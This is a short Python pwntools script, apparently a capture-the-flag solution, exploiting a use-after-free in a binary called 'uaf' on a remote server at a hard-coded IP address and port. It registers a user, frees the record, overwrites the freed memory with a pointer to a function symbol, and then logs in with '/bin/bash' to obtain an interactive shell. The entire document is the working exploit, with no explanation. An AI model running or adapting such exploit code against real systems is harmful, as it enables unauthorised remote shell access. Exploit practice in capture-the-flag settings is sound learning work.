#!/bin/python3
from pwn import *
elf = context.binary = ELF('uaf',checksec=False)
#p = process(elf.path)
p = remote('139.59.231.54', 9002)
context.terminal = ["tmux", "splitw", "-h"]
#gdb.attach(p)

def regist(nama):
    p.sendlineafter(b">>", b"1")
    p.sendlineafter(b": ", nama)

def reset():
    p.sendlineafter(b">>", b"3")

def change(nama):
    p.sendlineafter(b">>", b"4")
    p.sendlineafter(b": ", nama)

def login(nama):
    p.sendlineafter(b">>", b"2")
    p.sendlineafter(b": ", nama)

regist(b"A" * 24)
reset()
change(b"\x90" *8 + p64(elf.sym.os))
login(b"/bin/bash")

p.interactive()
